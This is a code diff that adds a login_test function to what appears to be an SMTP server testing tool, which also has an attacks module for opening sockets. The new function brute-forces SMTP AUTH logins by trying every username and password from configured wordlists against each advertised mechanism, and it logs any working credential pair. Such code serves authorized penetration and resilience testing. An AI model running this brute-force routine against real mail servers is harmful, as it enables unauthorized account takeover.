@@ -203,6 +203,50 @@ def open_sockets(host: str, count: int, port: int = 25, cfg: Config | None = Non
     return attacks.open_sockets(host, count, port, delay, cfg)
 
 
+def login_test(cfg: Config) -> dict[str, bool]:
+    """Attempt SMTP AUTH logins using wordlists.
+
+    Returns a mapping of mechanism name to success status.
+    """
+    host, port = parse_server(cfg.SB_SERVER)
+    smtp_cls = smtplib.SMTP_SSL if cfg.SB_SSL else smtplib.SMTP
+    with smtp_cls(host, port) as smtp:
+        if cfg.SB_STARTTLS and not cfg.SB_SSL:
+            smtp.starttls()
+        smtp.ehlo()
+        methods = smtp.esmtp_features.get("auth", "").split()
+
+    results: dict[str, bool] = {}
+    for mech in methods:
+        success = False
+        auth_attr = "auth_" + mech.lower().replace("-", "_")
+        for user in cfg.SB_USERLIST:
+            for pwd in cfg.SB_PASSLIST:
+                try:
+                    with smtp_cls(host, port) as sm:
+                        if cfg.SB_STARTTLS and not cfg.SB_SSL:
+                            sm.starttls()
+                        sm.ehlo()
+                        sm.user, sm.password = user, pwd
+                        sm.auth(mech, getattr(sm, auth_attr))
+                    logging.getLogger(__name__).info(
+                        "Auth %s success: %s:%s", mech, user, pwd
+                    )
+                    success = True
+                    break
+                except smtplib.SMTPAuthenticationError:
+                    continue
+                except smtplib.SMTPException:
+                    break
+            if success:
+                break
+        results[mech] = success
+        logging.getLogger(__name__).info(
+            "Authentication %s %s", mech, "succeeded" if success else "failed"
+        )
+    return results
+
+
 def send_test_email(cfg: Config) -> None:
     """Send a single minimal email using ``sendmail`` helper."""
 
